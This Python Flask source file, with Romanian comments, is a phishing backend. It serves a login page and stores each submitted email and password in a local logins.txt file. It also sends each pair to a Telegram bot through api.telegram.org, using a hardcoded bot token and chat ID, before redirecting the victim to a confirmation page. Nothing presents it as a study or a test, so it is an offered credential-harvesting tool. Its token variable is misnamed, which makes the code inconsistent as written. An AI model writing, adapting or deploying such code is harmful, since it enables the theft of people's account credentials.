from flask import Flask, request, render_template, redirect
import requests
import os

app = Flask(__name__)

# ---------------- TELEGRAM ---------------- #

BOT_TOKEN = "8366831885:AAGfZsn87eCTgMLNDJ19q9oGg-kuMyFtEnA"
CHAT_ID = "5937157896"

def trimite_telegram(email, password):
    if TELEGRAM_TOKEN and CHAT_ID:
        mesaj = f"🔐 LOGIN NOU\nEmail: {email}\nParola: {password}"
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

        try:
            requests.post(url, data={
                "chat_id": CHAT_ID,
                "text": mesaj
            })
        except:
            pass


# ---------------- RUTE ---------------- #

# Pagina principală (login)
@app.route("/")
def home():
    return render_template("login.html")


# Procesare formular
@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Salvează în fișier local
    with open("logins.txt", "a") as f:
        f.write(f"{email} , {password}\n")

    # Trimite pe Telegram
    trimite_telegram(email, password)

    # Redirecționează spre pagina de confirmare
    return redirect("/confirmare")


# Pagina confirmare
@app.route("/confirmare")
def confirmare():
    return render_template("confirmare.html")


# ---------------- RUN LOCAL ---------------- #

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
